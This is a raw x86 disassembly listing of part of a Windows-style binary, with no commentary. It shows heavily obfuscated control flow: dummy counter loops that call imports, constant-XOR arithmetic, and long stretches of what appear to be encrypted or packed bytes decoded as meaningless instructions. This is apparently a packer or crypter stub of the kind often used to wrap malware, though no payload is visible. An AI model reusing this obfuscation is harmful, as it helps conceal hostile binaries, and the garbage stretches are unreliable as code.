  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	imul   ecx,ecx,0xcc2b4430
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xd37e7e7c
  407c57:	shl    ch,0xdc
  407c5a:	push   0xdc0fa936
  407c5f:	add    dh,BYTE PTR [eax+eiz*1-0x705dd818]
  407c66:	(bad)  
  407c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c68:	dec    edx
  407c69:	push   cs
  407c6a:	int    0xf4
  407c6c:	adc    eax,0x6d01d1bf
  407c71:	(bad)
  407c74:	ror    BYTE PTR [ebx-0x1187e24b],0x6d
  407c7b:	xor    ah,BYTE PTR [edi+0x5f]
  407c7e:	stos   DWORD PTR es:[edi],eax
  407c7f:	mov    al,0xcc
  407c81:	pop    edx
  407c82:	push   eax
  407c83:	retf   0xccc8
  407c86:	test   BYTE PTR [esi+0x66],dl
  407c89:	in     al,dx
  407c8a:	cmc    
  407c8b:	xor    bh,BYTE PTR [edx+eiz*1+0x23]
  407c8f:	dec    ebp
  407c90:	xor    cl,al
  407c92:	sar    esi,1
  407c94:	and    dh,BYTE PTR [eax+0x5c]
  407c97:	jb     0x407c8b
  407c99:	add    al,0xe8
  407c9b:	jb     0x407cae
  407c9d:	scas   al,BYTE PTR es:[edi]
  407c9e:	ins    BYTE PTR es:[edi],dx
  407c9f:	and    eax,0xe512d47b
  407ca4:	dec    ecx
  407ca5:	push   ecx
  407ca6:	xchg   edi,eax
  407ca7:	frstor ds:0xbfef2f0b
  407cad:	fiadd  DWORD PTR [ebp-0x23]
  407cb0:	(bad)  
  407cb1:	hlt    
  407cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb3:	js     0x407c87
  407cb5:	push   eax
  407cb6:	test   al,0xe8
  407cb8:	inc    ebp
  407cb9:	mov    DWORD PTR [edx],esp
  407cbb:	jne    0x407d18
  407cbd:	add    al,0x5f
  407cbf:	mov    dl,0x6d
  407cc1:	cli    
  407cc2:	inc    ebp
  407cc3:	and    esp,DWORD PTR [eax-0x75dadb78]
  407cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cca:	(bad)  
  407ccb:	and    eax,0x2cbb7c25
  407cd0:	sbb    bl,BYTE PTR [esi-0x19802841]
  407cd6:	dec    ecx
  407cd7:	add    ebx,0xbfe37cb9
  407cdd:	inc    edx
  407cde:	or     BYTE PTR [esi+0x7c496a9c],bl
  407ce4:	mov    bh,BYTE PTR [ebp+0x80d4ff0]
  407cea:	mov    bl,0x2b
  407cec:	in     al,dx
  407ced:	daa    
  407cee:	ret    
  407cef:	xchg   edx,eax
  407cf0:	add    ah,BYTE PTR [ecx+ebx*2-0x31923b2c]
  407cf7:	cmc    
  407cf8:	arpl   WORD PTR [edi],bp
  407cfa:	mov    cl,0xcd
  407cfc:	dec    edx
  407cfd:	and    dh,BYTE PTR [eax+ecx*8+0x7]
  407d01:	cdq    
  407d02:	ficomp DWORD PTR [edx]
  407d04:	pop    edx
  407d05:	push   0x12
  407d07:	jmp    0x68a959c9
  407d0c:	xchg   ecx,eax
  407d0d:	scas   eax,DWORD PTR es:[edi]
  407d0e:	in     eax,0x35
  407d10:	and    BYTE PTR [ecx],bh
  407d12:	adc    eax,0x241e2ae9
  407d17:	push   0x70
  407d19:	push   esp
  407d1a:	fadd   QWORD PTR [ebx+0x450bf3a0]
  407d20:	xor    ah,BYTE PTR [ebx+ebx*4+0x61a9eb26]
  407d27:	dec    eax
  407d28:	add    al,0x59
  407d2a:	je     0x407d38
  407d2c:	clc    
  407d2d:	(bad)  
  407d2f:	sub    eax,0xc3159342
  407d34:	fild   QWORD PTR [ebx+0x3b]
  407d37:	xchg   BYTE PTR [edi],bl
  407d39:	adc    eax,0x4c8e4045
  407d3e:	enter  0x8cd5,0xf7
  407d42:	jl     0x407d56
  407d44:	xor    ah,BYTE PTR [edi-0x4325e906]
  407d4a:	xlat   BYTE PTR ds:[ebx]
  407d4b:	and    BYTE PTR [ecx+ecx*8+0x797b4379],bh
  407d52:	cdq    
  407d53:	fwait
  407d54:	mov    DWORD PTR [eax-0x3],edi
  407d57:	sub    esi,DWORD PTR [ebp+0x4b49c6f7]
  407d5d:	sti    
  407d5e:	xor    ecx,DWORD PTR [ebx]
  407d60:	fs retf 
  407d62:	fwait
  407d63:	call   0xe607c2
  407d68:	pop    ebx
  407d69:	fnsave [ebp-0x3b]
  407d6c:	and    ebp,edx
  407d6e:	mov    bh,0x23
  407d70:	enter  0x143d,0x78
  407d74:	fwait
  407d75:	out    0xa1,eax
  407d77:	mov    ds:0xbeba39c,al
  407d7c:	cmp    BYTE PTR [edx+0x4c3d2ed9],dl
  407d82:	fwait
  407d83:	jbe    0x407d74
  407d85:	inc    ebp
  407d86:	push   eax
  407d87:	in     al,dx
  407d88:	not    DWORD PTR [eax-0x57]
  407d8b:	add    DWORD PTR ds:0xc9149bff,esp
  407d92:	jbe    0x407d20
  407d94:	and    DWORD PTR [esi],esi
  407d96:	out    0x30,al
  407d98:	or     DWORD PTR [ebx-0x21],esp
  407d9b:	mov    fs,WORD PTR [ebx-0x5148e4fb]
  407da1:	stos   BYTE PTR es:[edi],al
  407da2:	sub    DWORD PTR [ebp+0x4c99173],esp
  407da8:	aam    0xad
  407daa:	xchg   esi,eax
  407dab:	or     edi,eax
  407dad:	std    
  407dae:	and    cl,BYTE PTR [esi+0x79]
  407db1:	mov    dl,0xc0
  407db3:	(bad)  
  407db4:	xchg   edx,eax
  407db5:	in     eax,0x62
  407db7:	mov    ah,0x3
  407db9:	addr16 (bad) 
  407dbb:	imul   ecx,edx,0xffffffc7
  407dbe:	xor    ch,ah
  407dc0:	xor    BYTE PTR [esi+edi*1+0x6d],0x17
  407dc5:	into   
  407dc6:	gs jg  0x407dff
  407dc9:	dec    ebx
  407dca:	pop    esp
  407dcb:	mov    esi,0x641ff12a
  407dd0:	mov    DWORD PTR [eax-0x4e07d899],esi
  407dd6:	push   ebx
  407dd7:	and    eax,0x90463b8d
  407ddc:	fdivr  DWORD PTR [eax+0x5b]
  407ddf:	pop    esi
  407de0:	pop    ds
  407de1:	pop    es
  407de2:	push   cs
  407de3:	sub    BYTE PTR [edi+0x480d080c],0x3b
  407dea:	adc    edi,DWORD PTR [edi+0x4a7b014f]
  407df0:	frstor [eax]
  407df2:	sahf   
  407df3:	cmp    DWORD PTR [edx+0x28d86bf3],eax
  407df9:	push   ebx
  407dfa:	xchg   ebp,eax
  407dfb:	loop   0x407d86
  407dfd:	or     DWORD PTR [edx+ebx*1-0x63],ebx
  407e01:	rcr    DWORD PTR [ebx+0xe],0x3a
  407e05:	and    bh,0x5c
  407e08:	out    0x17,al
  407e0a:	or     ah,BYTE PTR [bp+si+0x4e]
  407e0e:	bound  ebp,QWORD PTR [ebx]
  407e10:	mov    ds:0xbeefc2c0,al
  407e15:	add    DWORD PTR [edi-0x5ce4714f],esp
  407e1b:	mov    bh,0xa3
  407e1d:	ficom  DWORD PTR [ecx-0x50]
  407e20:	or     bh,BYTE PTR [edx-0x3f]
  407e23:	mov    eax,0xb90b07de
  407e28:	out    dx,al
  407e29:	mov    al,0x2a
  407e2b:	push   0xf4fcccc9
  407e30:	and    DWORD PTR [ebp+0x137cb7b],esp
  407e36:	pop    esi
  407e37:	mov    ebp,0x8ca8240c
  407e3c:	add    ebp,esp
  407e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e3f:	jnp    0x407e79
  407e41:	jno    0x407ec2
  407e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e44:	mov    ebp,0x9c21c1d8
  407e49:	je     0x407e10
  407e4b:	fimul  DWORD PTR [ecx]
  407e4d:	lidtd  [eax+0xb57d702]
  407e54:	adc    bh,BYTE PTR [edi-0x7d]
  407e57:	sbb    BYTE PTR [ebp+0x6f],0x75
  407e5b:	imul   esi,ebx,0x61
  407e5e:	in     al,dx
  407e5f:	mov    ch,0xd7
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x4016a30d
  408191:	xor    eax,0x7e7eca3e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	sub    dh,BYTE PTR [ebx-0x68]
  40819d:	icebp  
  40819e:	jbe    0x408203
  4081a0:	cmp    BYTE PTR [edi-0x4889658],al
  4081a6:	lahf   
  4081a7:	sbb    DWORD PTR [esi-0x7dda1d3b],eax
  4081ad:	clc    
  4081ae:	test   eax,0x5de767d6
  4081b3:	sbb    BYTE PTR [edi-0x2938c43],dl
  4081b9:	call   0x55d7:0x932c1052
  4081c0:	call   0xddf7:0x888c0836
  4081c7:	jno    0x408173
  4081c9:	push   esi
  4081ca:	lods   al,BYTE PTR ds:[esi]
  4081cb:	and    BYTE PTR [edx+0xc],al
  4081ce:	call   0x94c41784
  4081d3:	loop   0x4081dc
  4081d5:	call   0x4b955d0
  4081da:	je     0x40822e
  4081dc:	jecxz  0x408254
  4081de:	rcr    bl,cl
  4081e0:	es aaa 
  4081e2:	pushf  
  4081e3:	daa    
  4081e4:	pop    edi
  4081e5:	retf   
  4081e6:	ins    BYTE PTR es:[edi],dx
  4081e7:	fcmove st,st(2)
  4081e9:	popf   
  4081ea:	mov    BYTE PTR [edx],bl
  4081ec:	pop    ebp
  4081ed:	fs test eax,0xd475000b
  4081f3:	test   al,0x8a
  4081f5:	aam    0x48
  4081f7:	and    DWORD PTR [edx],ebp
  4081f9:	stc    
  4081fa:	xchg   esi,eax
  4081fb:	lock pop ebx
  4081fd:	sbb    BYTE PTR [ecx-0x67],bh
  408200:	inc    ebp
  408201:	test   DWORD PTR [ebp+0x20],0x1b7a7a18
  408208:	in     al,dx
  408209:	aaa    
  40820a:	sti    
  40820b:	stc    
  40820c:	mov    ecx,0x24bc044d
  408211:	adc    eax,0x98f7fc5e
  408216:	sbb    esi,DWORD PTR [esp+eiz*2]
  408219:	je     0x4081cf
  40821b:	sti    
  40821c:	stos   BYTE PTR es:[edi],al
  40821d:	mov    WORD PTR [esi],gs
  40821f:	(bad)  
  408220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408221:	xchg   ebx,eax
  408222:	leave  
  408223:	(bad)  
  408225:	repnz jmp 0xfa13:0x792a93ad
  40822d:	test   edx,0xe0d851d0
  408233:	pusha  
  408234:	repnz mov esp,0xd05938f2
  40823a:	imul   edx,DWORD PTR [edx-0x7aa7ca27],0xffffffdb
  408241:	scas   al,BYTE PTR es:[edi]
  408242:	xchg   edi,eax
  408243:	dec    esi
  408244:	mov    ebp,0x6a4e6a12
  408249:	fisubr DWORD PTR [ebp+0x6d93643a]
  40824f:	add    BYTE PTR [ebx+0x3be7fa38],dh
  408255:	mov    al,ds:0x8b512a64
  40825a:	test   al,0x41
  40825c:	arpl   WORD PTR cs:[edi-0x2b5fc9b6],sp
  408263:	mov    eax,ds:0x34c26ef
  408268:	jb     0x408224
  40826a:	call   esi
  40826c:	outs   dx,BYTE PTR ds:[esi]
  40826d:	gs xor eax,0x63308557
  408273:	and    BYTE PTR [eax],al
  408275:	adc    DWORD PTR [esi-0x7bb93915],ebx
  40827b:	and    BYTE PTR [ecx-0x36d9dc7b],dl
  408281:	mov    ds:0x5b3a92c,eax
  408286:	icebp  
  408287:	mov    esp,0xa7438c4a
  40828c:	rol    DWORD PTR [esi],cl
  40828e:	popa   
  40828f:	cld    
  408290:	aam    0xcb
  408292:	ins    BYTE PTR es:[edi],dx
  408293:	jnp    0x4082bb
  408295:	fstp   st(3)
  408297:	mov    dl,0xef
  408299:	cmp    al,0x5e
  40829b:	xchg   ecx,eax
  40829c:	pop    ebp
  40829d:	push   ss
  40829e:	scas   eax,DWORD PTR es:[edi]
  40829f:	pop    ebx
  4082a0:	pop    edx
  4082a1:	xchg   esp,eax
  4082a2:	mov    ebx,0x6d5d0348
  4082a7:	sbb    dl,cl
  4082a9:	cwde   
  4082aa:	sbb    eax,ecx
  4082ac:	jo     0x40829a
  4082ae:	stc    
  4082af:	push   cs
  4082b0:	sar    DWORD PTR [esp+eax*1+0x458a901e],1
  4082b7:	out    0xee,eax
  4082b9:	mov    edx,?
  4082bb:	clc    
  4082bc:	cmp    bl,ch
  4082be:	cmp    al,0x4
  4082c0:	dec    ebx
  4082c1:	push   esi
  4082c2:	js     0x40826f
  4082c4:	or     eax,0xd20d67d2
  4082c9:	add    eax,0x86d963cc
  4082ce:	fwait
  4082cf:	mul    eax
  4082d1:	adc    al,0xae
  4082d3:	cwde   
  4082d4:	lods   eax,DWORD PTR ds:[esi]
  4082d5:	adc    ah,BYTE PTR [esi]
  4082d7:	mov    ch,0x52
  4082d9:	xchg   DWORD PTR [ecx+0x1c95ad54],edi
  4082df:	dec    esp
  4082e0:	and    ebx,ebp
  4082e2:	lahf   
  4082e3:	add    DWORD PTR [ebx+0x70],ebp
  4082e6:	xchg   BYTE PTR [edx+eax*2-0x1d9caa9a],bl
  4082ed:	lea    eax,[edx+ebx*4+0x59289b5c]
  4082f4:	pushf  
  4082f5:	mov    al,ds:0x9d03eb84
  4082fa:	and    esi,ebx
  4082fc:	sbb    BYTE PTR [edx],dl
  4082fe:	xor    BYTE PTR [ebx+0x4f],bh
  408301:	mov    dh,0x4c
  408303:	shl    ebp,1
  408305:	sbb    BYTE PTR [edx+ecx*4-0x3c],ah
  408309:	(bad)  
  40830a:	pop    ecx
  40830b:	in     al,dx
  40830c:	push   DWORD PTR [ebp+0x28]
  40830f:	cmp    eax,DWORD PTR ds:0xd71a2d35
  408315:	mov    eax,0x67abbc17
  40831a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831b:	out    dx,eax
  40831c:	out    0xcf,al
  40831e:	and    ebx,DWORD PTR [edi+edx*4+0x7e393691]
  408325:	ror    BYTE PTR [edx-0x53],1
  408328:	or     bl,cl
  40832a:	mov    ah,0x2d
  40832c:	cld    
  40832d:	mov    bl,0xdd
  40832f:	cmp    al,0xb7
  408331:	push   edx
  408332:	xchg   edi,eax
  408333:	pop    ss
  408334:	cli    
  408335:	dec    esp
  408336:	cwde   
  408337:	aam    0xb
  408339:	pop    ss
  40833a:	jge    0x40835d
  40833c:	sbb    eax,0xc00e7292
  408341:	pop    es
  408342:	lds    ecx,FWORD PTR [ebx]
  408344:	stc    
  408345:	mov    ecx,0x67dd65d1
  40834a:	push   ebx
  40834b:	outs   dx,DWORD PTR ds:[esi]
  40834c:	in     al,0xe7
  40834e:	hlt    
  40834f:	(bad)  
  408350:	jmp    0xdba4da3c
  408355:	mov    esp,0x17b69eab
  40835a:	xor    cl,ch
  40835c:	push   edi
  40835d:	imul   edx,edx,0xdb1bebde
  408363:	das    
  408364:	pop    esp
  408365:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  408367:	ret    0xa546
  40836a:	sbb    al,0xf9
  40836c:	push   es
  40836d:	dec    esp
  40836e:	fwait
  40836f:	adc    al,0x88
  408371:	or     DWORD PTR [edx-0x2c],edx
  408374:	icebp  
  408375:	jmp    0x408335
  408377:	jb     0x4083ba
  408379:	or     al,dl
  40837b:	mov    ch,0xa9
  40837d:	mov    ds:0x731e0856,al
  408382:	add    ch,BYTE PTR [edx+0x5a24f921]
  408388:	call   0xeb2798d
  40838d:	mov    ecx,0x2aff281
  408392:	push   es
  408393:	add    edx,DWORD PTR [edx+0x4a]
  408396:	sub    DWORD PTR cs:[ecx+0x6],esi
  40839a:	out    0x80,eax
  40839c:	pop    ss
  40839d:	sub    al,0xd3
  40839f:	push   ebp
  4083a0:	jns    0x4083b8
  4083a2:	leave  
  4083a3:	mov    bh,BYTE PTR [ebp+0x77]
  4083a6:	push   0x25
  4083a8:	jmp    0xd660371d
  4083ad:	xchg   DWORD PTR [eax+edx*1-0x49],ebp
  4083b1:	adc    BYTE PTR [ebx],al
  4083b3:	lea    edx,ds:0xb301daba
  4083b9:	adc    DWORD PTR [esi+0x2debfdb],esp
  4083bf:	push   edx
  4083c0:	mov    dh,0xda
  4083c2:	loopne 0x4083d5
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	hlt    
  408465:	aas    
  408466:	xchg   esp,eax
  408467:	out    dx,al
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	add    dl,BYTE PTR [edi]
  408472:	call   0xe5fe4394
  408477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408478:	inc    edx
  408479:	dec    esi
  40847a:	pop    esi
  40847b:	dec    ebp
  40847c:	adc    BYTE PTR [ebx+0x65efb0df],bl
  408482:	sbb    BYTE PTR [edx],dl
  408484:	shr    BYTE PTR [esi*1-0x595faf95],cl
  40848b:	and    eax,0xa0d7dbf2
  408490:	xchg   BYTE PTR [esi],ah
  408492:	sbb    eax,edi
  408494:	inc    edx
  408495:	dec    esp
  408496:	mov    eax,DWORD PTR [eax-0x7e]
  408499:	push   sp
  40849b:	pop    eax
  40849c:	aad    0xc3
  40849e:	xchg   esi,eax
  40849f:	or     eax,0xc2d65dab
  4084a4:	jns    0x408448
  4084a6:	mov    ah,0x63
  4084a8:	mov    eax,0xc3cf15d
  4084ad:	mov    eax,0x2692a984
  4084b2:	adc    al,0xff
  4084b4:	aas    
  4084b5:	test   BYTE PTR [edx+0xd02c331],bl
  4084bb:	pop    ebx
  4084bc:	and    dh,BYTE PTR [edx-0x76ed837f]
  4084c2:	hlt    
  4084c3:	jmp    0x98d6:0x3c0fe174
  4084ca:	daa    
  4084cb:	les    ebp,FWORD PTR [edx-0x32]
  4084ce:	inc    esp
  4084cf:	fdivr  QWORD PTR [edi+edi*4-0x59f0c638]
  4084d6:	and    eax,ecx
  4084d8:	data16 fstp QWORD PTR [eax+0x16]
  4084dc:	mov    al,ds:0x55c40d79
  4084e1:	outs   dx,BYTE PTR ds:[esi]
  4084e2:	jb     0x4084b8
  4084e4:	pop    ebp
  4084e5:	xchg   edx,eax
  4084e6:	std    
  4084e7:	or     BYTE PTR ds:0x110f0f19,dl
  4084ed:	fisttp WORD PTR [ebp+0x3c81673d]
  4084f3:	push   ebp
  4084f4:	lds    eax,FWORD PTR [edi+0x26f08b3e]
  4084fa:	pop    esi
  4084fb:	adc    dh,BYTE PTR [ebp-0x4e]
  4084fe:	sbb    al,0xf1
  408500:	scas   eax,DWORD PTR es:[edi]
  408501:	cmp    eax,0x1a7e2d99
  408506:	cmc    
  408507:	sbb    BYTE PTR [ebx+edi*8-0x55],dl
  40850b:	iret   
  40850c:	xor    DWORD PTR [esi+0x1baf82ee],0x9fd5cba
  408516:	push   esi
  408517:	mov    eax,ds:0xc0303887
  40851c:	push   esi
  40851d:	ins    DWORD PTR es:[edi],dx
